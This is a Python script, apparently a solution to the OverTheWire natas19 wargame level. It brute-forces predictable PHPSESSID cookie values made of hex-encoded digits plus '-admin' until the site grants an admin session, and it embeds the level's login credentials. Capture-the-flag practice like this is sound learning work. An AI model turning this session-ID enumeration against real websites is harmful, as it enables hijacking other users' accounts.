#!/usr/bin/env python3
import requests
from itertools import product

ADDR = "http://natas19.natas.labs.overthewire.org/index.php"
CREDS = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

# hex for ASCII '0'–'9'
hexdigits = ["30", "31", "32", "33", "34", "35", "36", "37", "38", "39"]

admin_hex = "admin".encode().hex()
suffix = "2d" + admin_hex   # "-admin" in hex

s = requests.Session()
s.auth = CREDS
s.timeout = 5

for a, b, c in product(hexdigits, repeat=3):
    phpsessid = a + b + c + suffix

    resp = s.get(
        ADDR,
        cookies={"PHPSESSID": phpsessid}
    )

    if "You are an admin." in resp.text:
        print(f"PHPSESSID: {phpsessid}", end="\n")
        break
    else:
        print(f"PHPSESSID: {phpsessid}", end="\r", flush=True)
